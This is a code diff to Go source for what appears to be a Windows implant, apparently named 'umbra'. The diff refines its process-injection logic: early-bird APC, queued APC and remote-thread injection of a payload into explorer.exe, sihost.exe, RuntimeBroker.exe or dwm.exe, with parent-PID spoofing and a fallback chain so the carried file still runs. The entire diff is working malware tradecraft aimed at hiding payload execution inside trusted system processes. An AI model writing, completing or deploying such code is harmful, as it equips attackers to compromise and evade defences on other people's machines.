@@ -170,12 +170,32 @@ func remoteWrite(proc uintptr, data []byte) uintptr {
 	return addr
 }
 
+// injArg is appended to every process we spawn through a remote thread. The
+// spawned copy reads it and skips self-injection, which is what stops the
+// CRT/APC/earlybird path from forking itself forever (each injected copy used
+// to call injectSelf again -> unbounded process tree, one agent per generation).
+const injArg = " --umbra-inj"
+
+func cmdlineFor(exe string) []byte {
+	line := `"` + exe + `"` + injArg
+	return append([]byte(line), 0)
+}
+
+func findTargetPID() uint32 {
+	for _, name := range []string{"explorer.exe", "sihost.exe", "RuntimeBroker.exe", "dwm.exe"} {
+		if pid := findPID(name); pid != 0 {
+			return pid
+		}
+	}
+	return 0
+}
+
 func writePathAndStub(proc uintptr, exe string) (stub uintptr, ok bool) {
 	we := winExecAddr()
 	if we == 0 {
 		return 0, false
 	}
-	path := append([]byte(exe), 0)
+	path := cmdlineFor(exe)
 	pathAddr := remoteWrite(proc, path)
 	if pathAddr == 0 {
 		return 0, false
@@ -236,21 +256,46 @@ func createSuspended(image string, parent uint32) (proc, thread uintptr, pid uin
 	return pi.Process, pi.Thread, pi.Pid, true
 }
 
+// launchInjected runs the payload through the requested remote-thread technique
+// and falls back down the chain when the requested one cannot land, so choosing
+// earlybird on a host with no alertable thread still ends with the carried file
+// running rather than silently doing nothing.
 func launchInjected(exe, method string, ppid bool) bool {
-	we := winExecAddr()
-	if we == 0 {
+	var order []string
+	switch strings.ToLower(strings.TrimSpace(method)) {
+	case "earlybird":
+		order = []string{"earlybird", "crt", "apc"}
+	case "apc":
+		order = []string{"apc", "crt"}
+	case "crt":
+		order = []string{"crt", "apc"}
+	default:
+		order = []string{"crt"}
+	}
+	for _, m := range order {
+		if injectOnce(exe, m, ppid) {
+			return true
+		}
+	}
+	return false
+}
+
+func injectOnce(exe, method string, ppid bool) bool {
+	if winExecAddr() == 0 {
 		return false
 	}
 	parent := uint32(0)
 	if ppid {
 		parent = findPID("explorer.exe")
 	}
-	m := strings.ToLower(strings.TrimSpace(method))
-	switch m {
+	switch method {
 	case "earlybird":
 		image := filepath.Join(os.Getenv("WINDIR"), "System32", "RuntimeBroker.exe")
 		if _, err := os.Stat(image); err != nil {
 			image = filepath.Join(os.Getenv("WINDIR"), "System32", "notepad.exe")
+		}
+		if _, err := os.Stat(image); err != nil {
+			return false
 		}
 		proc, th, _, ok := createSuspended(image, parent)
 		if !ok {
@@ -262,14 +307,14 @@ func launchInjected(exe, method string, ppid bool) bool {
 		if !ok {
 			return false
 		}
-		pQueueAPC.Call(stub, th, 0)
+		r, _, _ := pQueueAPC.Call(stub, th, 0)
+		if r == 0 {
+			return false
+		}
 		pResumeTh.Call(th)
 		return true
 	case "apc":
-		pid := findPID("explorer.exe")
-		if pid == 0 {
-			pid = findPID("sihost.exe")
-		}
+		pid := findTargetPID()
 		if pid == 0 {
 			return false
 		}
@@ -290,10 +335,7 @@ func launchInjected(exe, method string, ppid bool) bool {
 		r, _, _ := pQueueAPC.Call(stub, th, 0)
 		return r != 0
 	default: // crt
-		pid := findPID("explorer.exe")
-		if pid == 0 {
-			pid = findPID("sihost.exe")
-		}
+		pid := findTargetPID()
 		if pid == 0 {
 			return false
 		}
